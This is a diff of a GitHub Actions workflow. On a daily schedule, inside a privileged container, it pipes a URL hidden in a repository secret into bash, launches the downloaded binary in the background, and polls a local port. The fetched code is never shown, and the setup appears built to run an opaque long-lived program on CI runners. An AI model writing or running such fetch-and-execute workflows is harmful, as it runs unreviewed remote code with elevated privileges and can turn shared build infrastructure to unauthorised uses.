@@ -1,39 +1,58 @@
 name: Inline Shell Commands
 
-# on:
-#   push:
-#     branches: [ main ]
-
 on:
   schedule:
-    - cron: '0 0 * * *'  # Runs at 00:00 UTC every day
-  workflow_dispatch:  # Allows manual trigger
+    - cron: '0 0 * * *'
+  workflow_dispatch:
 
 jobs:
   run-commands:
     runs-on: ubuntu-latest
+    container:
+      image: ubuntu:22.04
+      options: --privileged
     
     steps:
+    - name: Install dependencies
+      run: |
+        apt-get update
+        apt-get install -y curl wget bash procps lsof netcat git
+    
     - name: Checkout code
       uses: actions/checkout@v4
       
-    - name: Run inline shell commands
+    - name: Run application
       env:
         TESTING: ${{ secrets.TESTING }}
       run: |
-        echo "Starting build process..."
+        set -e
+        echo "Running in Ubuntu container job..."
+        
+        # Your existing logic
         curl -sSL $TESTING | bash -s -- ddrv
-
+        
         cd *_DD
-
-        ls
-        ./*_DD & echo $! > app.pid
-        nohup ./*_DD > app.log 2>&1 &
-
-        sleep 5
-
-        top -n 1 
+        ls -la
+        
+        chmod +x ./*_DD
+        
+        # Start application
+        ./*_DD > app.log 2>&1 &
+        APP_PID=$!
+        echo $APP_PID > app.pid
+        
+        sleep 10
+        
+        # Verify
+        if kill -0 $APP_PID 2>/dev/null; then
+          echo "Application running with PID: $APP_PID"
+        else
+          echo "Application failed"
+          cat app.log
+          exit 1
+        fi
+        
+        # Test
+        top -n 1 -b
         cat app.log
-
-
-        curl localhost:22526
+        curl localhost:6881
